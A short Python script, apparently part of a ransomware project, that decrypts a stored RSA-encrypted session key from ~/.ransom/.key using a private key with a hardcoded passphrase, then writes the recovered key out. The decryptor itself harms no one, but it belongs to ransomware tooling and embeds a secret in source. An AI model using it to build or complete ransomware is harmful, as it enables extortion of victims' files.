#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

secret_code = "Unguessable" # rsa key passw

path = os.path.expanduser("~/.ransom/.key")
pem_path = "public_key_gen/rsa_key.bin"

file_in = open(path, "rb")

encoded_key = open(pem_path, "rb").read()
private_key = RSA.importKey(encoded_key, passphrase=secret_code)

cipher_rsa = PKCS1_OAEP.new(private_key)
session_key = cipher_rsa.decrypt(file_in.read())

file_out = open(os.path.expanduser("~/.ransom/.clear_key"), 'wb')
file_out.write(session_key)
file_out.close()
